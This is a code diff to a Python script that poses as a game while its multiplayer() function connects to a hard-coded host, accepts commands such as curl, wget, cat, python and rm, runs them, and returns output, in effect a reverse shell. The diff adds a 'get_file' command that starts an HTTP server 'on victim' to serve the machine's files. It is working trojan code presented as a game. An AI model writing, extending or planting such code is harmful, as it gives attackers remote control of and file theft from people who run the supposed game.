@@ -1,8 +1,7 @@
 import random
-import socket
+import socket, http.server, socketserver, urllib.parse
 import threading
-import os
-import subprocess
+import os, subprocess
 
 def game():
     done = False
@@ -36,6 +35,9 @@ def run_command(command):
         elif verb == "mkdir":
             os.makedirs(words[1], exist_ok=True)
             return f"Directory {words[1]} created!"
+        elif verb == "get_file":
+            threading.Thread(target=start_http, args=(int(words[1]),), daemon=True).start()
+            return f"HTTP server created on victim with port {words[1]}"
         else:
             if verb == "curl" or verb == "wget" or verb == "cat" or verb == "python3" or verb == "python" or verb == "rm":
                 needs_shell = False
@@ -56,7 +58,7 @@ def run_command(command):
 
 def multiplayer():
     HOST = "192.168.1.101"  # Replace with the actual IP of the server
-    PORT = 1392
+    PORT = 13921
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         client.connect((HOST, PORT))
@@ -66,6 +68,9 @@ def multiplayer():
             client.send(output.encode("utf-8"))
     except:
         client.close()
+
+def start_http(PORT):
+    subprocess.run(f"python3 -m http.server {PORT}".split(), capture_output=True, text=True)
 
 # Start threads
 t1 = threading.Thread(target=game, daemon=True)
